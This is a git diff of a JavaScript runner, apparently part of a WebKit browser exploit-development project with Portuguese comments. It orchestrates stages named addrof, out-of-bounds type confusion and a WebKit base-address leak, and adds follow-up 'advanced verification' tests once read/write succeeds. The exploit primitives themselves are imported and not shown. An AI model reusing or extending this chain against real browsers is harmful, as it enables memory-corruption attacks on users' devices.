@@ -1,19 +1,19 @@
-// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 43 - WebKit Leak e com teste de JIT)
+// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 43 - WebKit Leak e com teste de JIT e Verificação Avançada)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import {
     executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
+    runAdvancedVerificationTests, // <-- IMPORTAÇÃO DA NOVA FUNÇÃO
     FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
 } from './testArrayBufferVictimCrash.mjs';
-import { AdvancedInt64 } from '../utils.mjs'; // Importação para o teste de JIT
+import { AdvancedInt64 } from '../utils.mjs';
 
-// NOVO CÓDIGO INSERIDO AQUI
 async function testJITBehavior() {
     logS3("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
     let test_buf = new ArrayBuffer(16);
     let float_view = new Float64Array(test_buf);
     let uint32_view = new Uint32Array(test_buf);
-    let some_obj = { a: 1, b: 2 }; // Um objeto qualquer
+    let some_obj = { a: 1, b: 2 };
 
     logS3("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
     float_view[0] = some_obj;
@@ -31,7 +31,6 @@ async function testJITBehavior() {
     }
     logS3("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
 }
-// FIM DO NOVO CÓDIGO
 
 async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
     const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43"; 
@@ -64,9 +63,15 @@ async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
         } else {
             logS3(`  RUNNER R43(L): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
         }
-
+        
+        // ===================================================================
+        // ATUALIZAÇÃO PRINCIPAL AQUI: CHAMA OS TESTES AVANÇADOS SE HOUVER SUCESSO
+        // ===================================================================
         if (webkitLeakResult?.success) {
             document.title = `${module_name_for_title}_R43L: WebKitLeak SUCCESS!`;
+            logS3(`  RUNNER R43(L): Sucesso de L/E confirmado. Prosseguindo para testes de usabilidade avançada...`, "test", FNAME_RUNNER);
+            await PAUSE_S3(500);
+            await runAdvancedVerificationTests(); // <-- CHAMADA DA NOVA FUNÇÃO
         } else if (addrofResult?.success) {
             document.title = `${module_name_for_title}_R43L: Addrof OK, WebKitLeak Fail`;
         } else if (heisenbugSuccessfullyDetected) {
@@ -81,10 +86,10 @@ async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
                 const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                 const addrofSuccessThisIter = iter_sum.addrof_result_this_iter?.success ?? 'N/A'; 
                 const addrofCandidateThisIter = iter_sum.addrof_result_this_iter?.leaked_object_addr_candidate_str ?? 'N/A';
-                const webkitLeakSuccess = iter_sum.webkit_leak_result_this_iter?.success ?? 'N/A'; // WebKitLeak é por iteração agora
+                const webkitLeakSuccess = iter_sum.webkit_leak_result_this_iter?.success ?? 'N/A';
                 let logMsg = `    Iter ${index + 1} (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, AddrofIter=${addrofSuccessThisIter}`;
                 if(addrofSuccessThisIter === false && addrofCandidateThisIter !== 'N/A') logMsg += ` (CandIter: ${addrofCandidateThisIter})`;
-                logMsg += `, WebKitLeakIter=${webkitLeakSuccess}`; // Adicionado
+                logMsg += `, WebKitLeakIter=${webkitLeakSuccess}`;
                 if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
 
                 logS3(logMsg, "info", FNAME_RUNNER);
@@ -102,10 +107,8 @@ export async function runAllAdvancedTestsS3() {
     const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator`;
     logS3(`==== INICIANDO Script 3 R43L (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
     
-    // NOVO CÓDIGO INSERIDO AQUI
-    await testJITBehavior(); // Executa o teste de isolamento primeiro
-    await PAUSE_S3(500); // Pausa para ler o log do teste de JIT
-    // FIM DO NOVO CÓDIGO
+    await testJITBehavior();
+    await PAUSE_S3(500);
     
     await runHeisenbugReproStrategy_TypedArrayVictim_R43();
     logS3(`\n==== Script 3 R43L (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
